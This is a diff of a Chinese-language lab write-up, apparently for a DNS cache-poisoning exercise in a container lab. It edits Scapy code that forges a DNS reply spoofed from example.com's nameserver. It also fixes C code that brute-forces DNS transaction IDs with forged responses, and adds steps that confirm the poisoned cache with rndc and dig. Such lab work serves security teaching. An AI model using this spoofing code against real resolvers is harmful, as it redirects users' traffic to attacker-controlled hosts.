@@ -167,13 +167,21 @@ Anssec = DNSRR(rrname = name, type = 'A', rdata = '1.2.3.4', ttl = 259200)
 NSsec = DNSRR(rrname = domain, type = 'NS', rdata = ns, ttl = 259200)
 dns = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)
 
-ip = IP(dst = '10.9.0.53', src = '23.210.7.166')
+ip = IP(dst = '10.9.0.53', src = '199.43.133.53')
 udp = UDP(dport = 33333, sport = 53, chksum = 0)
 pkt = ip/udp/dns
 
 with open('ip_resp.bin', 'wb') as f:
     f.write(bytes(pkt))
 ```
+
+需要注意的是，这里的 src 应该是 example.com 的 nameserver 地址而非 www.example.com 本身的 IP 地址（因为我是要伪造从它发起的响应），我们使用 `dig ns example.com` 查询 example.com 的 nameserver 地址：
+
+![](../../../../../assets/Pasted%20image%2020250410180348.png)
+
+可以看到有两个 nameserver，我们再 dig 其中一个：
+
+![](../../../../../assets/Pasted%20image%2020250410180441.png)
 
 运行 `python3 Generate_DNS_Reply.py` 生成 DNS 数据包模板 `ip.bin`，再编写 C 程序构建向 DNS 服务器发送伪造的响应数据包 `Attack.c`：
 
@@ -207,7 +215,7 @@ struct ipheader {
 
 void send_raw_packet(char * buffer, int pkt_size);
 void send_dns_request(unsigned char *packet_template, int packet_size, char *subdomain);
-void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, unsigned short transaction_id);
+void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, int transaction_id);
 
 int main()
 {
@@ -240,7 +248,7 @@ int main()
 
     send_dns_request(ip_req, n_req, name);
 
-    for(unsigned short tid = 0; tid < 65536; tid++){
+    for(int tid = 0; tid < 65536; tid++){
     	printf("tid: %u\n", tid);
         send_dns_response(ip_resp, n_resp, name, tid);
         sleep(2);
@@ -252,11 +260,9 @@ int main()
 /* Use for sending DNS request.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_request()
+void send_dns_request(unsigned char *packet_template, int packet_size, char *subdomain)
 {
 	memcpy(packet_template + 41, subdomain, 5);
-
-	memcpy(packet_template + 64, subdomain, 5);
 
 	send_raw_packet(packet_template, packet_size);
 }
@@ -265,7 +271,7 @@ void send_dns_request()
 /* Use for sending forged DNS response.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_response()
+void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, int transaction_id)
 {
 	memcpy(packet_template + 41, subdomain, 5);
 
@@ -310,6 +316,18 @@ void send_raw_packet(char * buffer, int pkt_size)
 ***
 ## 攻击结果验证
 
+首先在本地 DNS 服务器使用命令 `rndc flush` 清空缓存（因为之前我们已经手动伪造过响应计入缓存了）
+
 运行 Attack 程序后一段时间在本地 DNS 服务器使用命令 `rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db`，得到结果：
+
+![](../../../../../assets/Pasted%20image%2020250410180638.png)
+
+我们直接在用户容器中 `dig www.example.com`，得到结果：
+
+![](../../../../../assets/Pasted%20image%2020250410180732.png)
+
+可以看到攻击已经成功，已经不是我们先前查到的服务器 IP 了
+
+
 
 
